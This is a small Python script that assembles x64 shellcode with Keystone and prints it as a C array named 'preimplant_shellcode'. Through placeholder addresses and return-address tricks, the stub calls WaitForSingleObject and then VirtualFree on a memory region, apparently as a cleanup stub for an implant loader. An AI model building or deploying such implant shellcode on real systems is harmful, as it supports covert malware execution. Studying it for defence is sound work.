from keystone import *
import ctypes, struct

CODE = (
        " mov r12, 0x4141414141414141; "
        " mov r13, 0x4242424242424242;"  
        " mov r14, 0x4242424242424242; "  

        # WaitForSingleObject
        " mov rcx, 0xFFFFFFFFFFFFFFFE;"
        " push rcx; "
        " mov rdx, 0x2710;"
        " lea rax, [rip]; "
        " add rax, 0x08;"
        " push rax; "
        " push r14; "
        " ret;  " 
        
        # VirtualFree
        " mov rcx, r12; "
        " xor rdx, rdx; "
        " mov r8, 0x00008000; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rax, [rip]; "
        " add rax, 0x08;"
        " push rax; "
        " push r13; "
        " ret;  "
        
        
       


)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("unsigned char preimplant_shellcode[] = (\r\n\"" + instructions + "\");\r\n")
print("// Size: " + str(len(encoding)))
